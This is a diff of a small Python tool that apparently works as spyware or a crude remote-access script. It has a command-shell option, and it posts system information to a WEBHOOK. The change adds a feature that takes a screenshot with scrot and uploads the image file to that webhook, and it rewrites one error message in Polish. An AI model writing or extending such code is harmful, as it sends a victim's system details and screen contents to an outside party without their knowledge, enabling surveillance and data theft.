@@ -7,6 +7,7 @@ while True:
     print(f"""
     1 - Shell
     2 - System Info
+    3 - Screenshot
     """)
     uput = input("Choose an option: ")
 
@@ -19,7 +20,7 @@ while True:
                     os.chdir(cmd[3:].strip())
                     cwd = os.getcwd()
                 except:
-                    print("cd error")
+                    print("blad cd")
                 continue
             out = os.popen(cmd).read()
             print(out)
@@ -28,3 +29,7 @@ while True:
     elif uput == "2":
         out = os.popen("fastfetch --logo none --pipe").read()
         requests.post(WEBHOOK, data={"content": f"```{out}```"})
+    elif uput == "3":
+        os.system("scrot /tmp/screenshot.png")
+        with open("/tmp/screenshot.png", "rb") as f:
+            requests.post(WEBHOOK, files={"file": f})
